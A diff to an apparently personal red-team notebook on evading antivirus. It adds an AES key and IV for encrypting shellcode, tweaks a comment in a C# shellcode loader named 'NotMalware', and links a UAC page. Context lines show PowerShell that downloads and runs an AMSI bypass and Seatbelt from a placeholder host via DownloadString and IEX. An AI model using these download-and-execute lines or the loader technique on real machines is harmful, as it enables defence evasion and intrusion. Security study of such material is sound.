@@ -140,6 +140,12 @@ A [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20com
 		Output - Raw
 	To Base64 - Alphabet A-Za-z0-9+/=
 
+An arbitrary key and iv
+```
+1F768BD57CBF021B251DEB0791D8C197   # key
+EE7D63936AC1F286D8E4C5CA82DFA5E2   # iv
+```
+
 Modifying the program
 ```csharp
 <SNIP>
@@ -174,7 +180,7 @@ namespace NotMalware
                 }
             }
 
-            // Allocate RW space for shellcode
+            // Allocate RW space for shellcode (and the rest...)
             <SNIP>
 ```
 # Dynamic Analysis
@@ -625,3 +631,5 @@ $wc.DownloadString('http://ip/AMSI-Bypass.ps1')|IEX;
 $wc.DownloadString('http://ip/Invoke-Seatbelt.ps1')|IEX;
 Invoke-Seatbelt LSASettings # Example
 ```
+# User Account Control
+See [[User Account Control (UAC)]]
